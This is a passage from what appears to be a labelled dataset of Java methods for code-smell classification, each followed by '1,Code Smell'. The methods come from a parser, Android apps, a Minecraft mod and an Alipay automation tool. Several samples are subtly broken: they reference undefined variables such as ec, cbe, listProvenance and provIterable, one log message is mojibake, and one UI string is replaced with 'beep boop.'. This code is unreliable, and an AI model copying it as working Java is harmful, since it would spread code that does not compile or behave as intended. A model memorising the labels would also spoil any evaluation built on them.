    List<J.Annotation> typeParamsAnnotations=collectAnnotations(annotationPosTable);
    typeParams=new J.TypeParameters(randomId(),sourceBefore(""<""),Markers.EMPTY,typeParamsAnnotations,convertAll(node.getTypeParameters(),commaDelim,t -> sourceBefore("">"")));
  }
  List<J.Annotation> returnTypeAnnotations=collectAnnotations(annotationPosTable);
  TypeTree returnType=convertOrNull(node.getReturnType());
  if (returnType != null && !returnTypeAnnotations.isEmpty()) {
    returnType=new J.AnnotatedType(randomId(),Space.EMPTY,Markers.EMPTY,returnTypeAnnotations,returnType);
  }
  Symbol.MethodSymbol nodeSym=jcMethod.sym;
  J.MethodDeclaration.IdentifierWithAnnotations name;
  if (""<init>"".equals(node.getName().toString())) {
    String owner=null;
    if (nodeSym == null) {
      for (      Tree tree : getCurrentPath()) {
        if (tree instanceof JCClassDecl) {
          owner=((JCClassDecl)tree).getSimpleName().toString();
          break;
        }
      }
      if (owner == null) {
        throw new IllegalStateException(""Should have been able to locate an owner"");
      }
    }
 else {
      owner=jcMethod.sym.owner.name.toString();
    }
    name=new J.MethodDeclaration.IdentifierWithAnnotations(new J.Identifier(randomId(),sourceBefore(owner),Markers.EMPTY,emptyList(),owner,null,null),returnType == null ? returnTypeAnnotations : emptyList());
  }
 else {
    name=new J.MethodDeclaration.IdentifierWithAnnotations(new J.Identifier(randomId(),sourceBefore(node.getName().toString(),null),Markers.EMPTY,emptyList(),node.getName().toString(),null,null),returnType == null ? returnTypeAnnotations : emptyList());
  }
  Space paramFmt=sourceBefore(""("");
  JContainer<Statement> params=!node.getParameters().isEmpty() ? JContainer.build(paramFmt,convertAll(node.getParameters(),commaDelim,t -> sourceBefore("")"")),Markers.EMPTY) : JContainer.build(paramFmt,singletonList(padRight(new J.Empty(randomId(),sourceBefore("")""),Markers.EMPTY),EMPTY)),Markers.EMPTY);
  JContainer<NameTree> throws_=node.getThrows().isEmpty() ? null : JContainer.build(sourceBefore(""throws""),convertAll(node.getThrows(),commaDelim,noDelim),Markers.EMPTY);
  J.Block body=convertOrNull(node.getBody());
  JLeftPadded<Expression> defaultValue=node.getDefaultValue() == null ? null : padLeft(sourceBefore(""default""),convert(node.getDefaultValue()));
  return new J.MethodDeclaration(randomId(),fmt,Markers.EMPTY,modifierResults.getLeadingAnnotations(),modifierResults.getModifiers(),typeParams,returnType,name,params,throws_,body,defaultValue,typeMapping.methodDeclarationType(jcMethod.sym,null));
}",1,Code Smell
"public static void main(String[] args){
  int chessArr1[][]=new int[11][11];
  chessArr1[1][2]=1;
  chessArr1[2][3]=2;
  System.out.println(""原始的二维数组"");
  for (  int[] row : chessArr1) {
    for (    int data : row) {
      System.out.printf(""%d\t"",data);
    }
    System.out.println();
  }
  int sum=0;
  for (int i=0; i < 11; i++) {
    for (int j=0; j < 11; j++) {
      if (chessArr1[i][j] != 0) {
        sum++;
      }
    }
  }
  int sparseArr[][]=new int[sum + 1][3];
  sparseArr[0][0]=11;
  sparseArr[0][1]=11;
  sparseArr[0][2]=sum;
  int count=0;
  for (int i=0; i < 11; i++) {
    for (int j=0; j < 11; j++) {
      if (chessArr1[i][j] != 0) {
        count++;
        sparseArr[count][0]=i;
        sparseArr[count][1]=j;
        sparseArr[count][2]=chessArr1[i][j];
      }
    }
  }
  System.out.println();
  System.out.println(""得到稀疏数组为~~~~"");
  for (int i=0; i < sparseArr.length; i++) {
    System.out.printf(""%d\t%d\t%d\t\n"",sparseArr[i][0],sparseArr[i][1],sparseArr[i][2]);
  }
  System.out.println();
  int chessArr2[][]=new int[sparseArr[0][0]][sparseArr[0][1]];
  for (int i=1; i < sparseArr.length; i++) {
    chessArr2[sparseArr[i][0]][sparseArr[i][1]]=sparseArr[i][2];
  }
  System.out.println();
  System.out.println(""恢复后的二维数组"");
  for (  int[] row : chessArr2) {
    for (    int data : row) {
      System.out.printf(""%d\t"",data);
    }
    System.out.println();
  }
}",1,Code Smell
"private boolean updateModuleList(int uid,String packageName){
  Map<String,String> enabledModules=loadEnabledModules(uid);
  if (!enabledModules.containsKey(packageName))   return false;
  try {
    File moduleListFile=new File(CONFIG_PATH,uid + ""/"" + MODULES_LIST_FILENAME);
    File enabledModuleListFile=new File(CONFIG_PATH,uid + ""/"" + ENABLED_MODULES_LIST_FILENAME);
    if (moduleListFile.exists() && !moduleListFile.canWrite()) {
      moduleListFile.delete();
      moduleListFile.createNewFile();
    }
    if (enabledModuleListFile.exists() && !enabledModuleListFile.canWrite()) {
      enabledModuleListFile.delete();
      enabledModuleListFile.createNewFile();
    }
    PrintWriter modulesList=new PrintWriter(moduleListFile);
    PrintWriter enabledModulesList=new PrintWriter(enabledModuleListFile);
    for (    Map.Entry<String,String> module : enabledModules.entrySet()) {
      String apkPath=module.getValue();
      if (apkPath != null) {
        modulesList.println(module.getValue());
        enabledModulesList.println(module.getKey());
      }
 else {
        Utils.logI(String.format(""remove obsolete package %s"",packageName));
        File prefsDir=new File(CONFIG_PATH,uid + ""/prefs/"" + packageName);
        File[] fileList=prefsDir.listFiles();
        if (fileList != null) {
          for (          File childFile : fileList) {
            childFile.delete();
          }
        }
      }
    }
    modulesList.close();
    enabledModulesList.close();
  }
 catch (  Throwable e) {
    Utils.logE(""Fail to update module list"",e);
  }
  return true;
}
",1,Code Smell
"public static void receivePoint(){
  if (!Config.receivePoint())   return;
  new Thread(){
    @Override public void run(){
      try {
        while (FriendIdMap.getCurrentUid() == null || FriendIdMap.getCurrentUid().isEmpty())         Thread.sleep(100);
        if (Statistics.canMemberSignInToday(FriendIdMap.getCurrentUid())) {
          String s=AntMemberRpcCall.queryMemberSigninCalendar();
          JSONObject jo=new JSONObject(s);
          if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
            Log.other(""姣忔棩绛惧埌馃搮["" + jo.getString(""signinPoint"") + ""绉垎]#宸茬鍒�""+ jo.getString(""signinSumDay"")+ ""澶�"");
            Statistics.memberSignInToday(FriendIdMap.getCurrentUid());
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),s);
          }
        }
        queryPointCert(1,8);
        insBlueBean();
        signPageTaskList();
        if (Config.collectSesame())         zmxy();
        if (Config.merchantKmdk() || Config.zcjSignIn()) {
          JSONObject jo=new JSONObject(AntMemberRpcCall.transcodeCheck());
          if (jo.getBoolean(""success"")) {
            JSONObject data=jo.getJSONObject(""data"");
            if (data.optBoolean(""isOpened"")) {
              if (Config.zcjSignIn())               zcjSignIn();
              if (Config.merchantKmdk()) {
                if (TimeUtil.getTimeStr().compareTo(""0600"") > 0 && TimeUtil.getTimeStr().compareTo(""1200"") < 0)                 kmdkSignIn();
                kmdkSignUp();
              }
              taskListQuery();
            }
 else {
              Log.recordLog(""鍟嗗鏈嶅姟鏈紑閫氾紒"");
            }
          }
        }
      }
 catch (      Throwable t) {
        Log.i(TAG,""receivePoint.run err:"");
        Log.printStackTrace(TAG,t);
      }
    }
  }
.start();
}",1,Code Smell
"/** 
 * Unbinds the view for the specified item, and removes the item and all its children.
 * @param v the view being removed.
 * @param itemInfo the {@link ItemInfo} for this view.
 * @param deleteFromDb whether or not to delete this item from the db.
 */
public boolean removeItem(View v,final ItemInfo itemInfo,boolean deleteFromDb){
  return removeItem(v,itemInfo,deleteFromDb,null);
}
/** 
 * Unbinds the view for the specified item, and removes the item and all its children.
 * @param v the view being removed.
 * @param itemInfo the {@link ItemInfo} for this view.
 * @param deleteFromDb whether or not to delete this item from the db.
 * @param reason the resaon for removal.
 */
public boolean removeItem(View v,final ItemInfo itemInfo,boolean deleteFromDb,@Nullable final String reason){
  if (itemInfo instanceof WorkspaceItemInfo) {
    View folderIcon=mWorkspace.getHomescreenIconByItemId(itemInfo.container);
    if (folderIcon instanceof FolderIcon) {
      ((FolderInfo)folderIcon.getTag()).remove((WorkspaceItemInfo)itemInfo,true);
    }
 else {
      mWorkspace.removeWorkspaceItem(v);
    }
    if (deleteFromDb) {
      getModelWriter().deleteItemFromDatabase(itemInfo,reason);
    }
  }
 else   if (itemInfo instanceof FolderInfo) {
    final FolderInfo folderInfo=(FolderInfo)itemInfo;
    if (v instanceof FolderIcon) {
      ((FolderIcon)v).removeListeners();
    }
    mWorkspace.removeWorkspaceItem(v);
    if (deleteFromDb) {
      getModelWriter().deleteFolderAndContentsFromDatabase(folderInfo);
    }
  }
 else   if (itemInfo instanceof LauncherAppWidgetInfo) {
    final LauncherAppWidgetInfo widgetInfo=(LauncherAppWidgetInfo)itemInfo;
    mWorkspace.removeWorkspaceItem(v);
    if (deleteFromDb) {
      getModelWriter().deleteWidgetInfo(widgetInfo,getAppWidgetHolder(),reason);
    }
  }
 else {
    return false;
  }
  return true;
}
",1,Code Smell
"private void addReceivers(List<Long> receivers,FlowCopy flowCopy,UserInfo userInfo,List<UserInfo> userInfos){
  List<Long> roleIds=JSON.parseArray(flowCopy.getRoleIds(),Long.class);
  if (ObjectUtil.isNotNull(roleIds) && !roleIds.isEmpty()) {
    for (    Long roleId : roleIds) {
      receivers.addAll(queryUserByRoleId(userInfos,roleId));
    }
  }
  List<Integer> parentLevels=JSON.parseArray(flowCopy.getParentLevels(),Integer.class);
  if (ObjectUtil.isNotNull(parentLevels) && !parentLevels.isEmpty()) {
    if (ObjectUtil.isNotNull(userInfo.getParentId()) && userInfo.getParentId() > 0) {
      List<Integer> parentLevelsAsc=parentLevels.stream().sorted().collect(Collectors.toList());
      List<Long> parentUserIds=this.queryParentsSortByLevel(userInfos,userInfo.getParentId(),CollUtil.getLast(parentLevelsAsc));
      int parentMount=parentUserIds.size();
      if (parentMount > 0) {
        for (        Integer level : parentLevels) {
          if (level <= parentMount) {
            receivers.add(CollUtil.get(parentUserIds,level - 1));
          }
        }
      }
    }
  }
  if (ObjectUtil.equal(1,flowCopy.getIsSelf())) {
    receivers.add(userInfo.getUserId());
  }
}",1,Code Smell
"@Override public boolean onFragmentCreate(){
  if (chatId != 0) {
    currentChat=getMessagesController().getChat(chatId);
    if (currentChat == null) {
      currentChat=MessagesStorage.getInstance(currentAccount).getChatSync(chatId);
      if (currentChat != null) {
        getMessagesController().putChat(currentChat,true);
      }
 else {
        return false;
      }
      if (info == null) {
        info=MessagesStorage.getInstance(currentAccount).loadChatInfo(chatId,ChatObject.isChannel(currentChat),new CountDownLatch(1),false,false);
        if (info == null) {
          return false;
        }
      }
    }
  }
 else {
    currentUser=userId == 0 ? null : getMessagesController().getUser(userId);
    if (currentUser == null) {
      currentUser=MessagesStorage.getInstance(currentAccount).getUserSync(userId);
      if (currentUser != null) {
        getMessagesController().putUser(currentUser,true);
      }
 else {
        return false;
      }
      if (userInfo == null) {
        HashSet<Long> set=new HashSet<>();
        set.add(userId);
        List<TLRPC.UserFull> fulls=MessagesStorage.getInstance(currentAccount).loadUserInfos(set);
        if (!fulls.isEmpty()) {
          userInfo=fulls.get(0);
        }
 else {
          return false;
        }
      }
    }
  }
  if (currentChat != null) {
    avatarDrawable.setInfo(5,currentChat.title,null);
    isChannel=ChatObject.isChannel(currentChat) && !currentChat.megagroup;
    signMessages=currentChat.signatures;
    forum=currentChat.forum;
    canForum=userId == 0 && (forum || Math.max(info == null ? 0 : info.participants_count,currentChat.participants_count) >= getMessagesController().forumUpgradeParticipantsMin) && (info == null || info.linked_chat_id == 0);
    NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.chatInfoDidLoad);
    NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.chatAvailableReactionsUpdated);
  }
 else {
    avatarDrawable.setInfo(5,currentUser.first_name,null);
    isChannel=false;
    signMessages=false;
    forum=false;
    canForum=false;
    NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.userInfoDidLoad);
  }
  imageUpdater.parentFragment=this;
  imageUpdater.setDelegate(this);
  NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.updateInterfaces);
  if (info != null) {
    loadLinksCount();
  }
  return super.onFragmentCreate();
}",1,Code Smell
"@Override public boolean handlePlayerInteraction(Player player,InteractionHand activeHand,BlockPos localPos,AbstractContraptionEntity contraptionEntity){
  Contraption contraption=contraptionEntity.getContraption();
  MutablePair<StructureBlockInfo,MovementContext> actor=contraption.getActorAt(localPos);
  if (actor == null)   return false;
  MovementContext ctx=actor.right;
  if (ctx == null)   return false;
  if (contraption instanceof ElevatorContraption)   return elevatorInteraction(localPos,contraptionEntity,ec,ctx);
  if (contraptionEntity.level().isClientSide()) {
    if (contraption.presentBlockEntities.get(ctx.localPos) instanceof ContraptionControlsBlockEntity)     cbe.pressButton();
    return true;
  }
  ItemStack filter=ContraptionControlsMovement.getFilter(ctx);
  boolean disable=true;
  boolean invert=false;
  List<ItemStack> disabledActors=contraption.getDisabledActors();
  for (Iterator<ItemStack> iterator=disabledActors.iterator(); iterator.hasNext(); ) {
    ItemStack presentFilter=iterator.next();
    boolean sameFilter=ContraptionControlsMovement.isSameFilter(presentFilter,filter);
    if (presentFilter.isEmpty()) {
      iterator.remove();
      disable=false;
      if (!sameFilter)       invert=true;
      continue;
    }
    if (!sameFilter)     continue;
    iterator.remove();
    disable=false;
    break;
  }
  if (invert) {
    for (    MutablePair<StructureBlockInfo,MovementContext> pair : contraption.getActors()) {
      MovementBehaviour behaviour=AllMovementBehaviours.getBehaviour(pair.left.state());
      if (behaviour == null)       continue;
      ItemStack behaviourStack=behaviour.canBeDisabledVia(pair.right);
      if (behaviourStack == null)       continue;
      if (ContraptionControlsMovement.isSameFilter(behaviourStack,filter))       continue;
      if (contraption.isActorTypeDisabled(behaviourStack))       continue;
      disabledActors.add(behaviourStack);
      send(contraptionEntity,behaviourStack,true);
    }
  }
  if (filter.isEmpty())   disabledActors.clear();
  if (disable)   disabledActors.add(filter);
  contraption.setActorsActive(filter,!disable);
  ContraptionControlsBlockEntity.sendStatus(player,filter,!disable);
  send(contraptionEntity,filter,disable);
  AllSoundEvents.CONTROLLER_CLICK.play(player.level(),null,BlockPos.containing(contraptionEntity.toGlobalVector(Vec3.atCenterOf(localPos),1)),1,disable ? 0.8f : 1.5f);
  return true;
}",1,Code Smell
"public static String getNetworkInfo(Context context){
  StringBuilder sb=new StringBuilder();
  ConnectivityManager cm=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
  NetworkInfo ani=cm.getActiveNetworkInfo();
  List<NetworkInfo> listNI=new ArrayList<>();
  if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP)   listNI.addAll(Arrays.asList(cm.getAllNetworkInfo()));
 else   for (  Network network : cm.getAllNetworks()) {
    NetworkInfo ni=cm.getNetworkInfo(network);
    if (ni != null)     listNI.add(ni);
  }
  for (  NetworkInfo ni : listNI) {
    sb.append(ni.getTypeName()).append('/').append(ni.getSubtypeName()).append(' ').append(ni.getDetailedState()).append(TextUtils.isEmpty(ni.getExtraInfo()) ? """" : "" "" + ni.getExtraInfo()).append(ni.getType() == ConnectivityManager.TYPE_MOBILE ? "" "" + Util.getNetworkGeneration(ni.getSubtype()) : """").append(ni.isRoaming() ? "" R"" : """").append(ani != null && ni.getType() == ani.getType() && ni.getSubtype() == ani.getSubtype() ? "" *"" : """").append(""\r\n"");
  }
  try {
    Enumeration<NetworkInterface> nis=NetworkInterface.getNetworkInterfaces();
    if (nis != null)     while (nis.hasMoreElements()) {
      NetworkInterface ni=nis.nextElement();
      if (ni != null && !ni.isLoopback()) {
        List<InterfaceAddress> ias=ni.getInterfaceAddresses();
        if (ias != null)         for (        InterfaceAddress ia : ias)         sb.append(ni.getName()).append(' ').append(ia.getAddress().getHostAddress()).append('/').append(ia.getNetworkPrefixLength()).append(' ').append(ni.getMTU()).append(' ').append(ni.isUp() ? '^' : 'v').append(""\r\n"");
      }
    }
  }
 catch (  Throwable ex) {
    sb.append(ex.toString()).append(""\r\n"");
  }
  if (sb.length() > 2)   sb.setLength(sb.length() - 2);
  return sb.toString();
}",1,Code Smell
"/** 
 * Extract decorators (from a GC log line tag) and set the corresponding diary flags accordingly
 * @param line GC log line
 */
private void extractDecorators(String line){
  Decorators decorators=new Decorators(line);
  timeOfFirstEvent(decorators);
  extractTagsAndLevels(decorators);
  if (decorators.getLogLevel().isPresent()) {
    UnifiedLoggingLevel logLevel=decorators.getLogLevel().get();
    if (decorators.tagsContain(""gc,age""))     diary.setTrue(TENURING_DISTRIBUTION);
 else     if (decorators.tagsContain(""ref"") && logLevel.isGreaterThanOrEqualTo(UnifiedLoggingLevel.debug))     diary.setTrue(PRINT_REFERENCE_GC);
 else     if (decorators.tagsContain(""gc,phases"") && logLevel.isGreaterThanOrEqualTo(UnifiedLoggingLevel.debug))     diary.setTrue(GC_DETAILS);
 else     if (decorators.tagsContain(""gc,ergo""))     diary.setTrue(ADAPTIVE_SIZING);
    if (decorators.tagsContain(""safepoint""))     diary.setTrue(APPLICATION_STOPPED_TIME,APPLICATION_CONCURRENT_TIME);
    if (diary.isZGC()) {
      if (decorators.tagsContain(""task""))       diary.setTrue(GC_DETAILS);
 else       if (decorators.tagsContain(""heap""))       diary.setTrue(PRINT_HEAP_AT_GC);
 else       if (decorators.tagsContain(""tlab""))       diary.setTrue(TLAB_DATA);
 else       if (decorators.tagsContain(""gc,start"") && line.contains(""Garbage Collection (""))       diary.setTrue(GC_CAUSE);
 else       if (decorators.tagsContain(""gc,heap"")) {
        if (line.contains(""Heap before GC""))         diary.setTrue(PRINT_HEAP_AT_GC);
        diary.setTrue(GC_DETAILS);
      }
 else       if (decorators.tagsContain(""gc,ref""))       diary.setTrue(PRINT_REFERENCE_GC);
 else       if (decorators.tagsContain(""gc,heap"") && decorators.getLogLevel().get() == UnifiedLoggingLevel.debug)       diary.setTrue(PRINT_HEAP_AT_GC);
    }
 else     if (diary.isShenandoah()) {
      if (decorators.tagsContain(""gc,task"") || decorators.tagsContain(""gc,start""))       diary.setTrue(GC_DETAILS);
 else       if (decorators.tagsContain(""gc,ergo""))       diary.setTrue(ADAPTIVE_SIZING);
 else       if (decorators.tagsContain(""gc"") && line.contains(""Trigger""))       diary.setTrue(GC_CAUSE);
    }
  }
}
",1,Code Smell
"@Override public void onViewCreated(FrameLayout containerView){
  super.onViewCreated(containerView);
  recyclerListView.setOverScrollMode(View.OVER_SCROLL_NEVER);
  recyclerListView.setPadding(dp(6),0,dp(6),dp(button != null ? 68 : 0));
  recyclerListView.setOnItemClickListener((view,position) -> {
    if (view instanceof GroupCreateUserCell) {
      int peersPosition=position - 1 - usersStartRow;
      if (peersPosition < 0 || peersPosition >= peers.size()) {
        return;
      }
      long did=DialogObject.getPeerDialogId(peers.get(peersPosition));
      if (selectedPeers.contains(did)) {
        if (alreadyJoined.contains(did)) {
          AndroidUtilities.shakeViewSpring(view,shiftDp=-shiftDp);
          BotWebViewVibrationEffect.APP_ERROR.vibrate();
          ArrayList<TLObject> array=new ArrayList<>();
          String text;
          if (did >= 0) {
            array.add(getBaseFragment().getMessagesController().getUser(did));
            text=""beep boop."";
          }
 else {
            TLRPC.Chat chat=getBaseFragment().getMessagesController().getChat(-did);
            if (ChatObject.isChannelAndNotMegaGroup(chat)) {
              text=LocaleController.getString(""FolderLinkAlreadySubscribed"",R.string.FolderLinkAlreadySubscribed);
            }
 else {
              text=LocaleController.getString(""FolderLinkAlreadyJoined"",R.string.FolderLinkAlreadyJoined);
            }
            array.add(chat);
          }
          if (lastClickedDialogId != did || System.currentTimeMillis() - lastClicked > Bulletin.DURATION_SHORT) {
            lastClickedDialogId=did;
            lastClicked=System.currentTimeMillis();
            BulletinFactory.of(bulletinContainer,null).createChatsBulletin(array,text,null).setDuration(Bulletin.DURATION_SHORT).show();
          }
          return;
        }
        selectedPeers.remove(did);
        ((GroupCreateUserCell)view).setChecked(false,true);
      }
 else {
        selectedPeers.add(did);
        ((GroupCreateUserCell)view).setChecked(true,true);
      }
      updateCount(true);
      updateHeaderCell(true);
      announceSelection(false);
    }
  }
);
}",1,Code Smell
"private void restoreViewExtraInfo(WView wView,HashMap<String,ExtraInfo> currentMap){
  if (wView == null) {
    return;
  }
  final List<ExtraInfo> extraInfos=wView.getExtraInfos();
  if (extraInfos != null) {
    if (currentMap == null) {
      currentMap=new HashMap<>();
    }
 else {
      currentMap=new HashMap<>(currentMap);
    }
    for (int i=0; i < extraInfos.size(); i++) {
      final ExtraInfo extraInfo=extraInfos.get(i);
      extraInfo.setView(wView);
      if (!extraInfo.isTableMode()) {
        final String extraTag=extraInfo.getTag();
        final ExtraInfo parentExtra=currentMap.get(extraTag);
        if (parentExtra == null) {
          currentMap.put(extraTag,extraInfo);
          if (mExtraMap == null) {
            mExtraMap=new HashMap<>();
          }
          List<ExtraInfo> currentTagList=mExtraMap.get(extraTag);
          if (currentTagList == null) {
            currentTagList=new LinkedList<>();
            mExtraMap.put(extraTag,currentTagList);
          }
          currentTagList.add(extraInfo);
        }
 else {
          extraInfo.setParentExtraInfo(parentExtra);
          List<ExtraInfo> children=parentExtra.getChildren();
          if (children == null) {
            children=new LinkedList<>();
            parentExtra.setChildren(children);
          }
          children.add(extraInfo);
          currentMap.put(extraTag,extraInfo);
        }
      }
    }
  }
  for (int i=0; i < wView.getChildCount(); i++) {
    restoreViewExtraInfo(wView.getChildAt(i),currentMap);
  }
}",1,Code Smell
"public StoryPrivacyBottomSheet setValue(StoryPrivacy privacy){
  if (privacy == null) {
    return this;
  }
  selectedType=privacy.type;
  if (selectedType == TYPE_CONTACTS) {
    excludedContacts.clear();
    excludedContacts.addAll(privacy.selectedUserIds);
  }
 else   if (selectedType == TYPE_SELECTED_CONTACTS) {
    selectedContacts.clear();
    selectedContacts.addAll(privacy.selectedUserIds);
    selectedContactsByGroup.clear();
    selectedContactsByGroup.putAll(privacy.selectedUserIdsByGroup);
    selectedContactsCount=mergeUsers(selectedContacts,selectedContactsByGroup).size();
  }
 else   if (selectedType == TYPE_EVERYONE) {
    excludedEveryone.clear();
    excludedEveryone.addAll(privacy.selectedUserIds);
    excludedEveryoneByGroup.clear();
    excludedEveryoneByGroup.putAll(privacy.selectedUserIdsByGroup);
    excludedEveryoneCount=mergeUsers(excludedEveryone,excludedEveryoneByGroup).size();
  }
  if (privacy.isShare()) {
    startedFromSendAsMessage=true;
    activePage=PAGE_TYPE_SEND_AS_MESSAGE;
    messageUsers.clear();
    messageUsers.addAll(privacy.sendToUsers);
    viewPager.setPosition(1);
  }
  View[] viewPages=viewPager.getViewPages();
  if (viewPages[0] instanceof Page) {
    ((Page)viewPages[0]).bind(((Page)viewPages[0]).pageType);
  }
  if (viewPages[1] instanceof Page) {
    ((Page)viewPages[1]).bind(((Page)viewPages[1]).pageType);
  }
  return this;
}",1,Code Smell
"private void locateDirectives(){
  List<ProgramSource> programs=new ArrayList<>();
  List<ComputeSource> computes=new ArrayList<>();
  programs.add(shadow);
  programs.addAll(Arrays.asList(shadowcomp));
  programs.addAll(Arrays.asList(begin));
  programs.addAll(Arrays.asList(prepare));
  programs.addAll(Arrays.asList(gbuffersBasic,gbuffersBeaconBeam,gbuffersTextured,gbuffersTexturedLit,gbuffersTerrain,gbuffersTerrainSolid,gbuffersTerrainCutout,gbuffersDamagedBlock,gbuffersSkyBasic,gbuffersSkyTextured,gbuffersClouds,gbuffersWeather,gbuffersEntities,gbuffersEntitiesTrans,gbuffersEntitiesGlowing,gbuffersGlint,gbuffersEntityEyes,gbuffersBlock,gbuffersBlockTrans,gbuffersHand,dhShadow,dhTerrain,dhWater));
  for (  ComputeSource computeSource : setup) {
    if (computeSource != null) {
      computes.add(computeSource);
    }
  }
  for (  ComputeSource[] computeSources : beginCompute) {
    computes.addAll(Arrays.asList(computeSources));
  }
  for (  ComputeSource[] computeSources : compositeCompute) {
    computes.addAll(Arrays.asList(computeSources));
  }
  for (  ComputeSource[] computeSources : deferredCompute) {
    computes.addAll(Arrays.asList(computeSources));
  }
  for (  ComputeSource[] computeSources : prepareCompute) {
    computes.addAll(Arrays.asList(computeSources));
  }
  for (  ComputeSource[] computeSources : shadowCompCompute) {
    computes.addAll(Arrays.asList(computeSources));
  }
  Collections.addAll(computes,finalCompute);
  Collections.addAll(computes,shadowCompute);
  for (  ComputeSource source : computes) {
    if (source != null) {
      source.getSource().map(ConstDirectiveParser::findDirectives).ifPresent(constDirectives -> {
        for (        ConstDirectiveParser.ConstDirective directive : constDirectives) {
          if (directive.getType() == ConstDirectiveParser.Type.IVEC3 && directive.getKey().equals(""workGroups"")) {
            ComputeDirectiveParser.setComputeWorkGroups(source,directive);
          }
 else           if (directive.getType() == ConstDirectiveParser.Type.VEC2 && directive.getKey().equals(""workGroupsRender"")) {
            ComputeDirectiveParser.setComputeWorkGroupsRelative(source,directive);
          }
        }
      }
);
    }
  }
  programs.addAll(Arrays.asList(deferred));
  programs.add(gbuffersWater);
  programs.add(gbuffersHandWater);
  programs.addAll(Arrays.asList(composite));
  programs.add(compositeFinal);
  DispatchingDirectiveHolder packDirectiveHolder=new DispatchingDirectiveHolder();
  packDirectives.acceptDirectivesFrom(packDirectiveHolder);
  for (  ProgramSource source : programs) {
    if (source == null) {
      continue;
    }
    source.getFragmentSource().map(ConstDirectiveParser::findDirectives).ifPresent(directives -> {
      for (      ConstDirectiveParser.ConstDirective directive : directives) {
        packDirectiveHolder.processDirective(directive);
      }
    }
);
  }
  packDirectives.getRenderTargetDirectives().getRenderTargetSettings().forEach((index,settings) -> Iris.logger.debug(""Render target settings for colortex"" + index + "": ""+ settings));
}",1,Code Smell
"@Override public void run(){
  AssetManager assetManager=mContext.getResources().getAssets();
  for (  String fileName : srcFile) {
    if (fileName.contains(""."")) {
      InputStream is=null;
      FileOutputStream fos=null;
      try {
        is=assetManager.open(assetsFolderPath + File.separator + fileName);
        File destinationFile;
        if (assetsFolderPath.startsWith(STICKER_NAME_IN_ASSETS + File.separator)) {
          destinationFile=new File(getStickerPath(),assetsFolderPath.substring(assetsFolderPath.indexOf(File.separator) + 1) + File.separator + fileName);
        }
 else {
          destinationFile=new File(getStickerPath(),fileName);
        }
        fos=new FileOutputStream(destinationFile);
        byte[] buffer=new byte[1024];
        int len;
        while ((len=is.read(buffer)) != -1) {
          fos.write(buffer,0,len);
        }
      }
 catch (      IOException e) {
        e.printStackTrace();
      }
 finally {
        if (is != null) {
          try {
            is.close();
            is=null;
          }
 catch (          IOException e) {
            e.printStackTrace();
            is=null;
          }
        }
        if (fos != null) {
          try {
            fos.close();
            fos=null;
          }
 catch (          IOException e) {
            e.printStackTrace();
            fos=null;
          }
        }
      }
    }
 else {
      File dir=new File(getStickerPath(),fileName);
      if (!dir.exists()) {
        dir.mkdirs();
      }
      copyStickerToStickerPath(assetsFolderPath + File.separator + fileName);
    }
  }
}",1,Code Smell
"/** 
 * This function is used to recurse through prov objects and add them to a report when there is nothing to compare them to. It does not return anything, rather adds values to its first argument.
 * @param report An ObjectNode that this method will add values to.
 * @param keys A set of keys to use to look into provMap, this set is pulled into its own variableas the keys might be a subset of provMap.keySet().
 * @param provMap A Map of provenance objects
 * @param provIdentifier An identifier indicating how the values should added to the diff,either under the ReproUtil.OLD or ReproUtil.NEW designation
 */
private static void addProvWithoutDiff(ObjectNode report,Set<String> keys,TreeMap<String,Provenance> provMap,String provIdentifier){
  for (  String key : keys) {
    if (provMap.get(key) instanceof PrimitiveProvenance) {
      ObjectNode provVal=mapper.createObjectNode();
      provVal.put(provIdentifier,primitiveProvenance.getValue().toString());
      report.set(key,provVal);
    }
 else {
      if (provMap.get(key) instanceof ListProvenance<?>) {
        if (listProvenance.getList().size() > 0 && listProvenance.getList().get(0) instanceof ConfiguredObjectProvenance) {
          ArrayNode provArray=mapper.createArrayNode();
          for (int provListIndex=0; provListIndex < listProvenance.getList().size(); provListIndex++) {
            TreeMap<String,Provenance> subProvMap=iterToMap(((ConfiguredObjectProvenance)listProvenance.getList().get(provListIndex)).iterator());
            ObjectNode subNode=mapper.createObjectNode();
            addProvWithoutDiff(subNode,subProvMap.keySet(),subProvMap,provIdentifier);
            if (!subNode.isEmpty()) {
              provArray.add(subNode);
            }
          }
          if (!(provArray.isEmpty())) {
            report.set(key,provArray);
          }
        }
      }
 else       if (provMap.get(key) instanceof Iterable<?>) {
        ObjectNode subNode=mapper.createObjectNode();
        @SuppressWarnings(""unchecked"") Iterator<Pair<String,Provenance>> subIter=(Iterator<Pair<String,Provenance>>)provIterable.iterator();
        TreeMap<String,Provenance> subProvMap=iterToMap(subIter);
        addProvWithoutDiff(subNode,subProvMap.keySet(),subProvMap,provIdentifier);
        report.set(key,subNode);
      }
 else {
        throw new IllegalStateException(""Unknown type of provenance: "" + provMap.get(key).toString());
      }
    }
  }
}",1,Code Smell
"/** 
 * Iterates through the transactions that affect a given fragment container and tracks the shared element names across transactions. This is most useful in pop transactions where the names of shared elements are known.
 * @param containerId The container ID that is executing the transition.
 * @param records The list of transactions being executed.
 * @param isRecordPop For each transaction, whether it is a pop transaction or not.
 * @param startIndex The first index into records and isRecordPop to execute aspart of this transition.
 * @param endIndex One past the last index into records and isRecordPop to executeas part of this transition.
 * @return A map from the initial shared element name to the final shared element namebefore any onMapSharedElements is run.
 */
private static ArrayMap<String,String> calculateNameOverrides(int containerId,ArrayList<BackStackRecord> records,ArrayList<Boolean> isRecordPop,int startIndex,int endIndex){
  ArrayMap<String,String> nameOverrides=new ArrayMap<>();
  for (int recordNum=endIndex - 1; recordNum >= startIndex; recordNum--) {
    final BackStackRecord record=records.get(recordNum);
    if (!record.interactsWith(containerId)) {
      continue;
    }
    final boolean isPop=isRecordPop.get(recordNum);
    if (record.mSharedElementSourceNames != null) {
      final int numSharedElements=record.mSharedElementSourceNames.size();
      final ArrayList<String> sources;
      final ArrayList<String> targets;
      if (isPop) {
        targets=record.mSharedElementSourceNames;
        sources=record.mSharedElementTargetNames;
      }
 else {
        sources=record.mSharedElementSourceNames;
        targets=record.mSharedElementTargetNames;
      }
